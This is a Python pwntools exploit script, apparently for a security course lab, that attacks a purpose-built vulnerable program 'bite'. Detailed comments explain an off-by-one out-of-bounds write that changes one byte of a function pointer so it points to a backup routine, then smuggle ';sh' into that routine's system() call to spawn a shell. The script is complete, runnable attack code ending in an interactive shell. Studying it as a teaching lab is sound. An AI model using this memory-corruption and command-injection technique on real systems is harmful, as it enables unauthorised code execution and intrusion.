#!/usr/bin/env python3
#
# Lab 4 – Extra: bite / Struct OOB one-byte overwrite exploit
#
# Target (bite.c) summary:
#   - Global PRICE_LIST[256] array holds ingredient_t:
#         typedef struct __attribute__((__packed__)) {
#             char name[MAX_INGREDIENT_NAME_LEN];   // 8 bytes
#             unsigned char price;                  // 1 byte
#         } ingredient_t;
#
#   - sandwich_t:
#         typedef struct {
#             ingredient_t ingredients[MAX_INGREDIENTS]; // MAX_INGREDIENTS = 8
#             char *codename;                            // pointer (8 bytes)
#             void (*taste_function)(void);              // function pointer (8 bytes)
#         } sandwich_t;
#
#     Layout in memory (simplified, assuming 64-bit, no extra padding):
#       [ ingredients[0] (9 bytes) ]
#       [ ingredients[1] (9 bytes) ]
#       ...
#       [ ingredients[7] (9 bytes) ]  → total 8 * 9 = 72 bytes
#       [ codename pointer (8 bytes) ]   offset ≈ 72
#       [ taste_function pointer (8 bytes) ] offset ≈ 80
#
#   - order_sandwich():
#       * Asks how many ingredients (ingredient_num) ≤ MAX_INGREDIENTS.
#       * Then loops:
#             for (int i = 0; i <= ingredient_num; i++) { ... }
#         **BUG**: loop goes from i = 0 to i = ingredient_num *inclusive*.
#           If ingredient_num == 8, valid indices are 0..7, but loop uses i = 8 too.
#           → writes sandwich->ingredients[8], which is OUT-OF-BOUNDS.
#
#       * For each i:
#             memcpy(sandwich->ingredients[i].name, PRICE_LIST[idx].name, 8);
#             sandwich->ingredients[i].price = PRICE_LIST[idx].price;
#
#     So when i == 8:
#       - ingredients[8].name overlaps the codename pointer (8 bytes).
#       - ingredients[8].price overlaps the *lowest byte* of taste_function.
#
#   - add_custom():
#       * Lets us add new entries to PRICE_LIST:
#             name  → fully controlled string
#             price → 8-bit integer we choose
#
#   - eat(sandwich):
#       * Calls sandwich->taste_function();
#
#   - good_taste() and backup_orders():
#         void good_taste(void) { puts("Yum! Good!"); }
#         void backup_orders(char *backups_filename) {
#             snprintf(cmd, 127, "/bin/cp ./orders.txt %s", backups_filename);
#             system(cmd);
#         }
#
#     Initially, sandwich->taste_function = good_taste.
#     backup_orders() calls system("/bin/cp ./orders.txt <filename>").
#     If <filename> starts with something like ";sh", the shell sees:
#         cp ./orders.txt ;sh
#     and executes "sh" as a separate command.
#
# Exploit idea:
#   1. Add a custom PRICE_LIST entry with name ";sh" and any price.
#      Then make that the *first* ingredient in the sandwich.
#      This makes sandwich->ingredients[0].name == ";sh", i.e., the first bytes
#      of the sandwich struct in memory are ";sh\\0...".
#      Later, when we hijack taste_function to backup_orders, it will be called
#      with RDI = &sandwich (pointer to this struct). backup_orders() treats RDI
#      as char* backups_filename and prints it in the format string –
#      effectively using the start of the struct as string: ";sh...".
#
#   2. Add a second custom ingredient with name "OOB" and price = desired LSB
#      of &backup_orders. When we order a sandwich with ingredient_num = 8,
#      the loop will write ingredients[8].price = PRICE_LIST[OOB_idx].price.
#      That single byte write overlaps the least-significant byte of
#      sandwich->taste_function.
#
#      Because of the way the binary is laid out (and due to page alignment),
#      backup_orders and good_taste share all upper bytes, differing only
#      in the lowest 8 bits. Overwriting that last byte is enough to turn
#      the function pointer from good_taste into backup_orders.
#
#   3. Order a sandwich with 9 picks (ingredient_num = 8):
#         i = 0..8
#      - i = 0: choose the ";sh" ingredient → sandwich->ingredients[0].name = ";sh"
#      - i = 1..7: choose “dummy” ingredients (e.g., Tomato).
#      - i = 8: choose the "OOB" ingredient → writes its price byte into
#               ingredients[8].price → LSB of taste_function.
#
#   4. Finally, choose option "Eat". This calls sandwich->taste_function(),
#      which is now backup_orders(). The argument it sees (backups_filename)
#      is the sandwich pointer → backed by bytes starting ";sh...".
#      backup_orders builds command: "/bin/cp ./orders.txt ;sh".
#      system("/bin/cp ./orders.txt ;sh") spawns /bin/sh.
#
#   5. We talk to the spawned shell through pwntools.

import sys
import time
from pwn import *

# === Configuration ===
exe = './bin/bite'
try:
    # Load ELF for symbol resolution (&backup_orders, etc.)
    elf = ELF(exe, checksec=False)
except:
    print(f"[!] Binary {exe} not found. Run 'make ex1' first.")  # ex1 Makefile builds 'bite'
    sys.exit(1)

# Attach ELF to pwntools context for nicer logging / defaults.
context.binary = elf
context.log_level = 'info'


def solve():
    print("=== Lab 4 Ex 1: Struct OOB Solver (Blind Interaction) ===")

    # ------------------------------------------------------
    # 1. Compute the target LSB for taste_function pointer
    # ------------------------------------------------------
    #
    # We want to turn sandwich->taste_function from good_taste into
    # backup_orders using only a *single byte* overflow:
    #
    #   - Initially: taste_function = &good_taste
    #   - After OOB write: low byte is replaced with our chosen value
    #
    # For this trick to work, the binary is arranged so that good_taste
    # and backup_orders share all upper bytes, differing only in the
    # lowest 8 bits. That means:
    #   (&good_taste & ~0xFF) == (&backup_orders & ~0xFF)
    #
    # Therefore we only need the last byte of backup_orders’ address.
    backup_lsb = elf.symbols['backup_orders'] & 0xFF
    log.info(f"Target LSB for taste_function: {hex(backup_lsb)}")

    # ------------------------------------------------------
    # 2. Start the process (with unbuffered stdio if possible)
    # ------------------------------------------------------
    #
    # Using stdbuf helps avoid stdio buffering issues when we send many
    # small inputs quickly. If that fails, we fall back to plain process().
    try:
        p = process(['stdbuf', '-i0', '-o0', '-e0', exe])
    except Exception:
        p = process(exe)

    # Small helper to interact “blindly” with the menu:
    # We do not parse each prompt exactly, we just:
    #   - sleep a tiny bit
    #   - clear any pending output
    #   - send our line
    #
    # This works here because the program’s flow is predictable and
    # simple, and we always send inputs in the correct order.
    def send_blind(data: bytes, desc: str):
        # Give the program time to print its prompt
        time.sleep(0.1)
        # Clear buffered output to keep our recv buffers small
        try:
            p.clean(timeout=0.01)
        except Exception:
            pass
        log.info(f"Sending: {desc}")
        p.sendline(data)

    # ------------------------------------------------------
    # 3. Add first custom ingredient: payload name ";sh"
    # ------------------------------------------------------
    #
    # This ends up in PRICE_LIST[INGREDIENTS_COUNT] with name ";sh".
    # Later, when we build a sandwich and choose this ingredient, its
    # name is copied into sandwich->ingredients[i].name.
    #
    # We will make it the *first* ingredient so that:
    #   &sandwich (the struct base) points to bytes beginning with ";sh".
    #
    # Steps in menu:
    #   2 → Add custom ingredient
    #     name = ";sh"
    #     price = 1 (any small dummy value; it does not matter here)
    send_blind(b'2', "Menu: Add Custom (payload ';sh')")
    send_blind(b';sh', "Custom name: ';sh'")
    send_blind(b'1', "Custom price: 1")

    # ------------------------------------------------------
    # 4. Add second custom ingredient: OOB overwrite trigger
    # ------------------------------------------------------
    #
    # Second custom ingredient goes into the next PRICE_LIST slot:
    #   name = "OOB" (just for clarity)
    #   price = backup_lsb (the exact byte we want to write over LSB
    #                       of taste_function).
    #
    # Later, when we choose this ingredient as the *9th* (index 8) in
    # order_sandwich() with ingredient_num = 8, the line:
    #   sandwich->ingredients[8].price = PRICE_LIST[idx].price;
    # will write this byte over taste_function’s low byte.
    send_blind(b'2', "Menu: Add Custom (OOB overwrite)")
    send_blind(b'OOB', "Custom name: 'OOB'")
    send_blind(str(backup_lsb).encode(), f"Custom price: {backup_lsb}")

    # ------------------------------------------------------
    # 5. Order sandwich and set up the OOB write
    # ------------------------------------------------------
    #
    # Menu:
    #   1 → Order sandwich
    #
    # order_sandwich():
    #   - Asks “How many ingredients?” (<= MAX_INGREDIENTS).
    #   - Prints PRICE_LIST entries (including our two custom ones).
    #   - Then loops:
    #       for (i = 0; i <= ingredient_num; i++)
    #
    # To trigger out-of-bounds:
    #   - choose ingredient_num = 8.
    #     Valid indices: 0..7, but we get an extra iteration i = 8
    #     ⇒ ingredients[8] write crosses into codename/taste_function.
    send_blind(b'1', "Menu: Order sandwich")
    send_blind(b'8', "Ingredient count: 8 (forces i = 0..8)")

    # Ingredient indices shown to the user are 1-based:
    #   1. Tomato
    #   2. ...
    #   6. ;sh      (first custom)
    #   7. OOB      (second custom)
    #
    # We want:
    #   - i = 0: choose ";sh" so ingredients[0].name = ";sh"
    #   - i = 1..7: arbitrary valid ingredient (dummy filler)
    #   - i = 8: choose "OOB" so ingredients[8].price gets our target byte
    #
    # Remember: code decrements user input:
    #     scanf("%u", &ingredient_idx);
    #     ingredient_idx--;
    # So user input 6 → ingredient_idx = 5 → PRICE_LIST[5] (first custom).
    send_blind(b'6', "Ingredient 0: payload ';sh' (PRICE_LIST index 5)")

    # Ingredients 1..7: dummy choices (e.g., Tomato is option '1').
    for i in range(1, 8):
        send_blind(b'1', f"Ingredient {i}: dummy (Tomato)")

    # Ingredient 8 (i = 8): choose the OOB ingredient.
    # User input 7 → ingredient_idx = 6 → PRICE_LIST[6] (second custom).
    #
    # This assignment:
    #   sandwich->ingredients[8].price = PRICE_LIST[6].price;
    #
    # overwrites the low byte of sandwich->taste_function with backup_lsb.
    send_blind(b'7', "Ingredient 8: OOB (writes LSB of taste_function)")

    # Name the sandwich (any string). This fills sandwich->codename, which
    # we don’t need, since we already corrupted taste_function.
    send_blind(b'PwnWich', "Sandwich name")

    # ------------------------------------------------------
    # 6. Eat the sandwich → call hijacked taste_function
    # ------------------------------------------------------
    #
    # Menu:
    #   3 → Eat
    #
    # eat(sandwich_t *sandwich):
    #   sandwich->taste_function();
    #
    # Because we partially overwrote the function pointer, it now points
    # to backup_orders instead of good_taste. The call is done with RDI
    # = sandwich (the pointer to our struct), so backup_orders() sees
    # that as its argument `char *backups_filename`.
    #
    # The first bytes at &sandwich are ingredients[0].name, which we set
    # to ";sh". backup_orders does:
    #   snprintf(cmd, 127, "/bin/cp ./orders.txt %s", backups_filename);
    #   system(cmd);
    #
    # With backups_filename == ";sh", the spawned shell runs:
    #   /bin/sh -c "/bin/cp ./orders.txt ;sh"
    #
    # The ';' ends the cp command, then shell executes the next token "sh",
    # giving us a shell.
    send_blind(b'3', "Menu: Eat (triggers backup_orders)")

    # ------------------------------------------------------
    # 7. Interact with the spawned shell
    # ------------------------------------------------------
    log.success("Exploit chain complete. Checking for shell...")

    # Flush any residual output, then send basic commands.
    try:
        p.clean()
    except Exception:
        pass

    p.sendline(b'id; ls')
    p.interactive()


if __name__ == "__main__":
    solve()

